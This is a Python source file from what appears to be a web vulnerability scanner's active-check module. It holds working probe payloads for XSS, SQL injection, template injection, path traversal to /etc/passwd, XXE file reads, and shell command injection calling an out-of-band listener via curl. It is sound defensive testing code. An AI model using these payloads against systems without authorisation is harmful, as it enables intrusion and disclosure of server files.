#------------------------------------------------------------------------------
# Wyrm — wyrm/security/audit/checks.py
# Copyright (c) 2023-present ByKh R&D Group. Licensed under the MIT License (see LICENSE).
# Authors: Kim, Oda, Kwan, Naly
#------------------------------------------------------------------------------
"""Active checks. Each check's run(point, build, send, baseline, rand) returns a finding dict or None.

`send(url, headers, body)` performs one request and returns {"status", "headers" (lower-cased dict), "text",
"location", "url"} — or None on a network error. Checks are safe: no brute force, small fixed payload sets,
evidence confirmed against the response (and the baseline, to avoid false positives).
"""
from __future__ import annotations

import re

REDIRECT_NAMES = {"url", "uri", "next", "redirect", "redirect_uri", "redirect_url", "return", "returnurl",
                  "return_to", "dest", "destination", "continue", "to", "goto", "out", "target", "r", "u"}

_SQL_ERRORS = re.compile("|".join([
    r"SQL syntax.*MySQL", r"Warning.*\bmysqli?_", r"MySqlException", r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PG::\w*Error", r"syntax error at or near",
    r"ORA-\d{5}", r"Oracle error", r"quoted string not properly terminated",
    r"Microsoft OLE DB Provider for SQL Server", r"Unclosed quotation mark after the character string",
    r"Microsoft SQL Native Client error", r"SQLServer JDBC Driver", r"\bSqlException\b",
    r"System\.Data\.SQLite\.SQLiteException", r"sqlite3\.\w*Error", r'near ".*": syntax error',
    r"SQLSTATE\[", r"Incorrect syntax near",
]), re.I)

_PASSWD = re.compile(r"root:.*?:0:0:", re.S)
_WININI = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.I)


def _finding(check, point, payload, evidence, confidence, resp):
    return {"check": check.key, "title": check.title, "severity": check.severity, "confidence": confidence,
            "loc": point["loc"], "param": point["name"], "payload": payload, "evidence": evidence,
            "status": resp.get("status"), "url": resp.get("url", "")}


class ReflectedXSS:
    key, title, severity = "xss", "Reflected XSS", "high"

    def run(self, point, build, send, baseline, rand, oob=None):
        marker = f"wz{rand}"
        payload = f"{marker}<img src=x onerror=alert(1)>"
        r = send(*build(payload))
        if r and payload in r["text"]:
            return _finding(self, point, payload,
                            "The payload was reflected unescaped in the response — HTML/JS can be injected.",
                            "firm", r)
        probe = f'{marker}"\'><svg/onload=1>'
        r2 = send(*build(probe))
        if r2 and probe in r2["text"]:
            return _finding(self, point, probe,
                            "Angle brackets and quotes were reflected unescaped; likely XSS (verify the context).",
                            "tentative", r2)
        return None


class SqlError:
    key, title, severity = "sqli", "SQL injection (error-based)", "high"

    def run(self, point, build, send, baseline, rand, oob=None):
        base = point.get("value", "")
        if baseline and _SQL_ERRORS.search(baseline.get("text", "")):
            return None   # the page already shows a SQL error without us — not our injection
        for inj in ("'", '"', "')", "' AND '1'='2"):
            r = send(*build(base + inj))
            if r and _SQL_ERRORS.search(r["text"]):
                m = _SQL_ERRORS.search(r["text"])
                return _finding(self, point, base + inj,
                                f"A database error appeared after injecting {inj!r}: …{m.group(0)[:120]}…",
                                "firm", r)
        return None


def _similar(a: dict, b: dict) -> bool:
    """Two responses look 'the same page': same status and body length within a small tolerance (absorbs minor
    dynamic variance like timestamps/tokens). Used to tell a TRUE condition (page unchanged) from FALSE."""
    if not a or not b or a.get("status") != b.get("status"):
        return False
    la, lb = len(a.get("text", "") or ""), len(b.get("text", "") or "")
    return abs(la - lb) <= max(48, int(0.02 * max(la, lb, 1)))


class SqlBlindBoolean:
    """Boolean-based blind SQL injection: with no error or timing, inject a condition that is always TRUE and one
    that is always FALSE. If the TRUE page matches the original and the FALSE page differs, the input is reaching
    SQL whose logic we control. Fast (no sleeps), so it runs at every intensity."""

    key, title, severity = "sqli", "SQL injection (blind, boolean-based)", "high"

    def run(self, point, build, send, baseline, rand, oob=None):
        if not baseline or point.get("loc") not in ("query", "body-form", "json", "path"):
            return None
        base = point.get("value", "")
        pairs = [
            (f"{base}' AND '1'='1'-- -", f"{base}' AND '1'='2'-- -"),   # string context
            (f"{base} AND 1=1", f"{base} AND 1=2"),                      # numeric context
            (f"{base}') AND ('1'='1", f"{base}') AND ('1'='2"),         # bracketed string context
        ]
        for tp, fp in pairs:
            rt = send(*build(tp))
            rf = send(*build(fp))
            if not rt or not rf:
                continue
            # TRUE ~ original page, FALSE clearly different from both the original and the TRUE response
            if _similar(rt, baseline) and not _similar(rf, baseline) and not _similar(rt, rf):
                return _finding(self, point, tp,
                                "A TRUE condition returned the original page while a FALSE condition changed it — "
                                "boolean-based blind SQL injection.", "firm", rt)
        return None


class SqlBlindTime:
    """Blind, time-based SQL injection: when no error leaks, confirm injection by making the DB sleep. A payload
    that delays the response ~N seconds, and ~2N when doubled, proves the input reaches SQL that we can control
    (covering MySQL SLEEP, Postgres pg_sleep and MSSQL WAITFOR, in string and numeric contexts). Slow by design,
    so it only runs at 'Thorough' intensity (time_based)."""

    key, title, severity = "sqli", "SQL injection (blind, time-based)", "high"

    # payload templates; {b}=original value, {n}=seconds. Each pairs a sleep with a comment/boolean close.
    _TEMPLATES = [
        "{b}' AND SLEEP({n})-- -", "{b}' AND SLEEP({n}) AND '1'='1", "{b}') AND SLEEP({n})-- -",
        "{b}'; WAITFOR DELAY '0:0:{n}'-- -", "{b}' || pg_sleep({n})-- -", "{b}';SELECT pg_sleep({n})-- -",
        "{b} AND SLEEP({n})", "{b});SELECT pg_sleep({n})--",
    ]

    def __init__(self, time_based: bool = True, probe_secs: tuple = (4, 8)):
        self.time_based = time_based
        self.probe_secs = probe_secs   # (first, confirm); confirm should be ~2x first

    def run(self, point, build, send, baseline, rand, oob=None):
        import time
        if not self.time_based:
            return None
        if point.get("loc") not in ("query", "body-form", "json", "path"):   # bound the cost to the common spots
            return None
        n1, n2 = self.probe_secs
        base = point.get("value", "")
        t0 = time.monotonic()
        send(*build(base))                     # measure normal latency so a naturally slow endpoint isn't flagged
        base_lat = time.monotonic() - t0
        if base_lat >= n1 * 0.9:               # already slow/noisy — a time oracle would be unreliable here
            return None
        for tmpl in self._TEMPLATES:
            s1 = time.monotonic()
            r1 = send(*build(tmpl.format(b=base, n=n1)))
            if (time.monotonic() - s1) - base_lat < n1 * 0.75:
                continue                       # no delay for this dialect/context — try the next
            s2 = time.monotonic()             # confirm: the longer sleep must delay it proportionally more
            p2 = tmpl.format(b=base, n=n2)
            r2 = send(*build(p2))
            if (time.monotonic() - s2) - base_lat >= n2 * 0.75:
                return _finding(self, point, p2,
                                f"The response time scaled with an injected SQL sleep (~{n1}s then ~{n2}s) — "
                                "blind, time-based SQL injection.", "firm", r2 or r1 or {})
        return None


class Ssti:
    key, title, severity = "ssti", "Server-side template injection", "high"

    def run(self, point, build, send, baseline, rand, oob=None):
        product = "1787569"   # 1337*1337, distinctive
        for expr in ("{{1337*1337}}", "${1337*1337}", "#{1337*1337}", "<%= 1337*1337 %>", "{1337*1337}"):
            r = send(*build(expr))
            if r and product in r["text"] and expr not in r["text"]:
                return _finding(self, point, expr,
                                f"The template expression {expr} was evaluated to {product} — template injection.",
                                "firm", r)
        return None


class PathTraversal:
    key, title, severity = "traversal", "Path traversal", "high"

    def run(self, point, build, send, baseline, rand, oob=None):
        for payload in ("../../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
                        "..\\..\\..\\..\\..\\..\\windows\\win.ini"):
            r = send(*build(payload))
            if not r:
                continue
            if _PASSWD.search(r["text"]) or _WININI.search(r["text"]):
                return _finding(self, point, payload,
                                "A system file (/etc/passwd or win.ini) was returned — path traversal.", "firm", r)
        return None


class OpenRedirect:
    key, title, severity = "open-redirect", "Open redirect", "medium"

    def run(self, point, build, send, baseline, rand, oob=None):
        name, val = point["name"].lower(), point.get("value", "")
        if point["loc"] not in ("query", "body-form"):
            return None
        if name not in REDIRECT_NAMES and not (val.startswith(("http://", "https://", "/"))):
            return None
        host = f"wyrm{rand}.example.test"
        for payload in (f"https://{host}/", f"//{host}/"):
            r = send(*build(payload))
            if r and r.get("status") in (301, 302, 303, 307, 308):
                loc = (r.get("location") or "")
                if host in loc:
                    return _finding(self, point, payload,
                                    f"The app redirected (HTTP {r['status']}) to the attacker-controlled host "
                                    f"({loc[:120]}) — open redirect.", "firm", r)
        return None


class CrlfInjection:
    key, title, severity = "crlf", "CRLF / header injection", "medium"

    def run(self, point, build, send, baseline, rand, oob=None):
        marker = f"wyrm{rand}"
        payload = point.get("value", "") + f"\r\n{marker}: 1"   # raw CRLF; query/form builders url-encode it
        r = send(*build(payload))
        if r and marker.lower() in {k.lower() for k in r.get("headers", {})}:
            return _finding(self, point, payload,
                            f"An injected header ({marker}) appeared in the response — CRLF/header injection.",
                            "firm", r)
        return None


class Ssrf:
    key, title, severity = "ssrf", "Server-side request forgery (SSRF)", "high"

    def run(self, point, build, send, baseline, rand, oob=None):
        if oob is None:
            return None
        token = oob.token()
        url = oob.url(token)
        if not url:
            return None
        r = None
        for payload in (url, "//" + url.split("://", 1)[-1]):   # full URL, then scheme-relative
            r = send(*build(payload)) or r
        if oob.wait_hit(token, 10):
            return _finding(self, point, url,
                            "The server fetched our out-of-band URL — it makes requests to an attacker-controlled "
                            "host (SSRF).", "firm", r or {})
        return None


class CommandInjection:
    key, title, severity = "cmdi", "OS command injection", "high"

    def __init__(self, time_based: bool = True):
        self.time_based = time_based   # the sleep-based probe is reliable but slow; can be turned off

    def run(self, point, build, send, baseline, rand, oob=None):
        import time
        base = point.get("value", "")
        # 1) out-of-band: inject a shell command that calls our listener (reliable, fast)
        if oob is not None:
            token = oob.token()
            url = oob.url(token)
            if url:
                r = None
                for p in (f"{base};curl {url}", f"{base}|curl {url}", f"{base}&&curl {url}",
                          f"{base}`curl {url}`", f"{base}$(curl {url})"):
                    r = send(*build(p)) or r
                if oob.wait_hit(token, 10):
                    return _finding(self, point, f"{base};curl {url}",
                                    "An injected shell command called our out-of-band URL — OS command injection.",
                                    "firm", r or {})
        # 2) time-based fallback (no OOB needed): a sleep payload delays the response; confirm with a longer sleep
        if not self.time_based:
            return None
        if point.get("loc") not in ("query", "body-form", "json", "path"):   # bound the cost
            return None
        for mk in (lambda n: f"{base}; sleep {n}", lambda n: f"{base}$(sleep {n})"):
            t = time.monotonic()
            send(*build(mk(4)))
            if time.monotonic() - t >= 3.5:
                t2 = time.monotonic()
                r2 = send(*build(mk(8)))
                if time.monotonic() - t2 >= 7:   # the longer sleep delayed it too → not just a slow endpoint
                    return _finding(self, point, mk(8),
                                    "The response was delayed in step with an injected sleep command — time-based "
                                    "OS command injection.", "firm", r2 or {})
        return None


def _inject_first_text(xml: str, value: str):
    """Replace the first non-empty text node in an XML document with `value`. Returns (new_xml, replaced?)."""
    done = {"v": False}

    def repl(m):
        done["v"] = True
        return ">" + value + "<"
    # a '>' followed by text containing at least one non-space char, then '<'
    out = re.sub(r">(?=[^<>&]*[^\s<>&])[^<>&]*<", repl, xml, count=1)
    return out, done["v"]


def _xml_with_entity(body: str, entity_def: str, ref: str) -> str | None:
    """Add a DOCTYPE defining an external entity and reference it in the first text node. None if there's no
    text node to carry the reference (an unreferenced entity wouldn't prove anything)."""
    doctype = f"<!DOCTYPE wyrm [ {entity_def} ]>"
    m = re.match(r"\s*<\?xml[^>]*\?>", body)
    base = (body[:m.end()] + doctype + body[m.end():]) if m else (doctype + body)
    out, ok = _inject_first_text(base, ref)
    return out if ok else None


class Xxe:
    """XML external entity injection (request-level): when the request sends XML, define an external entity that
    reads a local file (or calls an out-of-band URL) and reference it in the document. If the file content comes
    back — or the OOB listener is hit — the XML parser resolves external entities (XXE)."""

    key, title, severity = "xxe", "XML external entity (XXE)", "high"

    def _is_xml(self, headers, body) -> bool:
        if not body or not isinstance(body, str):
            return False
        ct = " ".join(str(v) for k, v in headers.items() if k.lower() == "content-type").lower()
        if "xml" in ct:
            return True
        b = body.lstrip()
        return b.startswith("<?xml") or bool(re.match(r"<[a-zA-Z][\w:.-]*[\s>]", b) and "</" in b)

    def run_request(self, method, url, headers, body, send, baseline, rand, oob=None):
        if not self._is_xml(headers, body):
            return None
        hdrs = dict(headers)
        hdrs.setdefault("Content-Type", "application/xml")

        def finding(payload_body, evidence, resp):
            return {"check": self.key, "title": self.title, "severity": self.severity, "confidence": "firm",
                    "loc": "body-xml", "param": "XML entity", "payload": payload_body[:300],
                    "evidence": evidence, "status": (resp or {}).get("status"), "url": url}

        # 1) out-of-band: entity fetches our listener (works even when the file isn't reflected back)
        if oob is not None:
            token = oob.token()
            ourl = oob.url(token)
            if ourl:
                p = _xml_with_entity(body, f'<!ENTITY xxe SYSTEM "{ourl}">', "&xxe;")
                r = send(url, hdrs, p) if p else None
                if p and oob.wait_hit(token, 10):
                    return finding(p, "The XML parser fetched our out-of-band URL via an external entity — XXE.", r)
        # 2) classic in-band file read: /etc/passwd then win.ini
        for ent in ('<!ENTITY xxe SYSTEM "file:///etc/passwd">', '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">'):
            p = _xml_with_entity(body, ent, "&xxe;")
            if not p:
                return None
            r = send(url, hdrs, p)
            if r and (_PASSWD.search(r.get("text", "")) or _WININI.search(r.get("text", ""))):
                return finding(p, "A local system file (/etc/passwd or win.ini) was returned via an external "
                                  "entity — XXE with file disclosure.", r)
        return None


class GraphqlIntrospection:
    """GraphQL introspection exposure (request-level): if the target is a GraphQL endpoint and introspection is
    left enabled, anyone can download the full schema (every type, query and mutation), which greatly eases
    attacking the API. Best practice is to disable introspection in production."""

    key, title, severity = "graphql-introspection", "GraphQL introspection enabled", "low"
    _QUERY = '{"query":"query{__schema{queryType{name} types{name kind}}}"}'

    def run_request(self, method, url, headers, body, send, baseline, rand, oob=None):
        b = body if isinstance(body, str) else ""
        looks_gql = "graphql" in url.lower() or '"query"' in b or bool(re.search(r"\b(query|mutation)\s*[\({]", b))
        if not looks_gql or (method or "").upper() != "POST":   # introspection is a POST; avoid false probes on GET
            return None
        r = send(url, {**headers, "Content-Type": "application/json"}, self._QUERY)
        if not r or r.get("status") != 200:
            return None
        text = str(r.get("text", ""))
        if '"__schema"' in text or '"queryType"' in text or ('"types"' in text and '"kind"' in text):
            return {"check": self.key, "title": self.title, "severity": self.severity, "confidence": "firm",
                    "loc": "request", "param": "", "payload": self._QUERY,
                    "evidence": "The GraphQL endpoint answered an introspection query with its schema — "
                                "introspection is enabled, exposing all types, queries and mutations.",
                    "status": r.get("status"), "url": url}
        return None


class HostHeaderInjection:
    """Host header injection (request-level): many apps build absolute URLs (password-reset links, redirects,
    cached asset URLs) from the incoming Host / X-Forwarded-Host. If an attacker-controlled host is reflected in
    a redirect Location or in the page, it enables password-reset poisoning and web-cache poisoning."""

    key, title, severity = "host-header", "Host header injection", "medium"

    def run_request(self, method, url, headers, body, send, baseline, rand, oob=None):
        evil = f"wyrm{rand}.attacker.example"
        variants = [
            {"X-Forwarded-Host": evil},                               # most common and least disruptive
            {"X-Forwarded-Host": evil, "X-Forwarded-Scheme": "https"},
            {"X-Host": evil},
            {"Host": evil},                                           # direct override (may be rejected by routing)
        ]
        for extra in variants:
            r = send(url, {**headers, **extra}, body)
            if not r:
                continue
            H = r.get("headers", {})
            loc = str(H.get("location", "") or r.get("location", ""))
            injected = next(iter(extra))
            if evil in loc:
                return {"check": self.key, "title": self.title, "severity": "high", "confidence": "firm",
                        "loc": "request", "param": injected, "payload": f"{injected}: {evil}",
                        "evidence": f"A redirect Location was built from the injected host ({loc[:120]}) — "
                                    "host-header injection (password-reset poisoning / open redirect).",
                        "status": r.get("status"), "url": url}
            if evil in str(r.get("text", "")):
                return {"check": self.key, "title": self.title, "severity": "medium", "confidence": "firm",
                        "loc": "request", "param": injected, "payload": f"{injected}: {evil}",
                        "evidence": f"The injected host ({evil}) was reflected in the response body (absolute "
                                    "links/scripts) — host-header injection (web-cache poisoning).",
                        "status": r.get("status"), "url": url}
        return None


class CorsMisconfig:
    """CORS misconfiguration (request-level): send an attacker Origin and see whether the app trusts it. Reflecting
    an arbitrary Origin in Access-Control-Allow-Origin lets any site make cross-origin reads; doing so with
    Allow-Credentials: true exposes authenticated responses to any origin (critical). 'null' is also commonly
    exploitable (sandboxed iframes, redirects)."""

    key, title, severity = "cors", "CORS misconfiguration", "medium"

    def run_request(self, method, url, headers, body, send, baseline, rand, oob=None):
        evil = f"https://wyrm{rand}.attacker.example"
        r = send(url, {**headers, "Origin": evil}, body)
        if not r:
            return None
        H = r.get("headers", {})     # lower-cased keys
        acao = str(H.get("access-control-allow-origin", "")).strip()
        creds = str(H.get("access-control-allow-credentials", "")).strip().lower() == "true"

        def finding(sev, evidence):
            return {"check": self.key, "title": self.title, "severity": sev, "confidence": "firm",
                    "loc": "request", "param": "Origin", "payload": f"Origin: {evil}",
                    "evidence": evidence, "status": r.get("status"), "url": url}

        if acao == evil:
            if creds:
                return finding("high", f"The app reflected our Origin ({evil}) in Access-Control-Allow-Origin AND "
                                       "sent Allow-Credentials: true — any website can read this user's "
                                       "authenticated responses.")
            return finding("medium", f"The app reflected our arbitrary Origin ({evil}) in "
                                     "Access-Control-Allow-Origin — any website can read these responses.")
        if acao.lower() == "null":
            return finding("medium", "Access-Control-Allow-Origin is 'null', which attacker-controlled sandboxed "
                                     "contexts can also present — cross-origin reads may be possible.")
        if acao == "*" and creds:
            return finding("medium", "Access-Control-Allow-Origin: * with Allow-Credentials: true is an invalid "
                                     "but risky combination — review the CORS policy.")
        return None


def standard(time_based: bool = True) -> list:
    """The full active check set. time_based=False drops the slow sleep-based probes (blind SQLi, command inj.)."""
    return [ReflectedXSS(), SqlError(), SqlBlindBoolean(), SqlBlindTime(time_based=time_based), Ssti(),
            PathTraversal(), OpenRedirect(), CrlfInjection(), CorsMisconfig(), HostHeaderInjection(),
            GraphqlIntrospection(), Xxe(), Ssrf(), CommandInjection(time_based=time_based)]


ALL_CHECKS = standard(True)
